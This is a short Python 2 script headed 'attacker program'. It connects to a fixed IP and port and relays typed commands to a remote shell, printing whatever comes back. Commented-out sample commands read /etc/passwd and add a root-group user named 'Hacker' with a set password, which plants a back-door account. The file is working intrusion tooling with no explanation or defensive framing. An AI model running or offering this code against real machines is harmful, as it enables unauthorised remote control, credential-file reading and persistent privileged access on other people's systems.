# attacker program

import socket

address = ('172.16.143.140', 31500)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(address)

def execute(command):
	s.send(command)
	ret = s.recv(10240)
	print ret

# execute("cat /etc/passwd")
# execute("sudo useradd Hacker -g root")
# execute("sudo passwd hacker")
# execute("hackerpwd")
# execute("hackerpwd")
# execute("id hacker")
# execute("cat /etc/passwd")

while True:
	command = raw_input()
	print '*' * 20
	print command
	print '*' * 20
	if command:
		execute(command)

s.close()
